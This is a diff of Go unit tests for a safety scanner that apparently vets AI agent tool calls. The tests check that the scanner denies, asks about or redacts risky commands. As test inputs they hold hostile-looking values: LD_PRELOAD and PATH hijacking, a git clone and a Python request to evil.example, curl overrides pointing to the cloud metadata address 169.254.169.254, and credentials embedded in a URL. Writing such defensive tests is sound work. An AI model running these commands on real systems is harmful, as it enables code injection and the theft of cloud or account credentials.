@@ -10,6 +10,7 @@ package safety
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
 	"strings"
 	"testing"
@@ -323,8 +324,41 @@ func TestDefaultScanner_EnvAllowlistBlocksUnknownEnv(t *testing.T) {
 		},
 	})
 	require.NoError(t, err)
-	require.Equal(t, DecisionAsk, report.Decision)
-	require.Equal(t, "env.not_allowlisted", report.RuleID)
+	require.Equal(t, DecisionDeny, report.Decision)
+	require.Equal(t, "env.process_control", report.RuleID)
+	require.True(t, report.Blocked)
+}
+
+func TestDefaultScanner_RejectsUnsupportedBackend(t *testing.T) {
+	report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
+		ToolName:   "exec_command",
+		Backend:    Backend("HOST"),
+		Command:    "python -i",
+		Background: true,
+		TTY:        true,
+	})
+	require.NoError(t, err)
+	require.Equal(t, BackendUnknown, report.Backend)
+	require.Equal(t, DecisionDeny, report.Decision)
+	require.Equal(t, RiskCritical, report.RiskLevel)
+	require.Equal(t, "backend.unsupported", report.RuleID)
+	require.True(t, report.Blocked)
+	require.Contains(t, report.Evidence, `unsupported backend "HOST"`)
+}
+
+func TestDefaultScanner_DeniesProcessControlEnvWithoutAllowlist(t *testing.T) {
+	report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
+		ToolName: "exec_command",
+		Backend:  BackendHost,
+		Command:  "echo ok",
+		Env: map[string]string{
+			"PATH":       "/tmp/attacker/bin",
+			"LD_PRELOAD": "/tmp/hook.so",
+		},
+	})
+	require.NoError(t, err)
+	require.Equal(t, DecisionDeny, report.Decision)
+	require.Equal(t, "env.process_control", report.RuleID)
 	require.True(t, report.Blocked)
 }
 
@@ -415,6 +449,93 @@ func TestDefaultScanner_EdgeCoverageCases(t *testing.T) {
 }
 
 func TestDefaultScanner_NetworkAndCodeEdges(t *testing.T) {
+	t.Run("network allowlist applies to git clone", func(t *testing.T) {
+		report, err := MustDefaultScanner(Policy{
+			NetworkAllowlist: []string{"allowed.example"},
+		}).Scan(context.Background(), ScanRequest{
+			ToolName: "workspace_exec",
+			Backend:  BackendWorkspace,
+			Command:  "git clone https://evil.example/repo",
+		})
+		require.NoError(t, err)
+		require.Equal(t, DecisionDeny, report.Decision)
+		require.Equal(t, "network.non_allowlisted_domain", report.RuleID)
+	})
+
+	t.Run("network allowlist applies to interpreter URL calls", func(t *testing.T) {
+		report, err := MustDefaultScanner(Policy{
+			NetworkAllowlist: []string{"allowed.example"},
+		}).Scan(context.Background(), ScanRequest{
+			ToolName: "execute_code",
+			Backend:  BackendCodeExec,
+			Language: "python",
+			Code:     `import urllib.request; urllib.request.urlopen("https://evil.example")`,
+		})
+		require.NoError(t, err)
+		require.Equal(t, DecisionDeny, report.Decision)
+		require.Equal(t, "network.non_allowlisted_domain", report.RuleID)
+	})
+
+	t.Run("curl destination override is denied with allowlist", func(t *testing.T) {
+		report, err := MustDefaultScanner(Policy{
+			NetworkAllowlist: []string{"allowed.example"},
+		}).Scan(context.Background(), ScanRequest{
+			ToolName: "workspace_exec",
+			Backend:  BackendWorkspace,
+			Command:  "curl --resolve allowed.example:443:169.254.169.254 https://allowed.example",
+		})
+		require.NoError(t, err)
+		require.Equal(t, DecisionDeny, report.Decision)
+		require.Equal(t, "network.destination_override", report.RuleID)
+	})
+
+	t.Run("curl destination override asks without allowlist", func(t *testing.T) {
+		report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
+			ToolName: "workspace_exec",
+			Backend:  BackendWorkspace,
+			Command:  "curl --connect-to allowed.example:443:169.254.169.254:443 https://allowed.example",
+		})
+		require.NoError(t, err)
+		require.Equal(t, DecisionAsk, report.Decision)
+		require.Equal(t, "network.destination_override", report.RuleID)
+	})
+
+	t.Run("allowlisted URL credentials are denied and redacted", func(t *testing.T) {
+		report, err := MustDefaultScanner(Policy{
+			NetworkAllowlist: []string{"allowed.example"},
+		}).Scan(context.Background(), ScanRequest{
+			ToolName: "workspace_exec",
+			Backend:  BackendWorkspace,
+			Command:  "curl https://alice:s3cr3t@allowed.example/path",
+		})
+		require.NoError(t, err)
+		require.Equal(t, DecisionDeny, report.Decision)
+		require.Equal(t, "secret.inline_value", report.RuleID)
+		require.True(t, report.Redacted)
+		require.NotContains(t, report.Command, "alice")
+		require.NotContains(t, report.Command, "s3cr3t")
+		encoded, err := json.Marshal(report)
+		require.NoError(t, err)
+		require.NotContains(t, string(encoded), "s3cr3t")
+	})
+
+	t.Run("benign token metadata is not a secret", func(t *testing.T) {
+		for _, raw := range []string{
+			`{"max_tokens":128}`,
+			`{"token_count":42}`,
+			`{"authorization_required":false}`,
+		} {
+			report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
+				ToolName:     "mcp_call",
+				Backend:      BackendUnknown,
+				RawArguments: []byte(raw),
+			})
+			require.NoError(t, err)
+			require.Equal(t, DecisionAllow, report.Decision, raw)
+			require.Equal(t, "evaluation.none", report.RuleID, raw)
+		}
+	})
+
 	t.Run("network command without URL asks", func(t *testing.T) {
 		report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
 			ToolName: "workspace_exec",
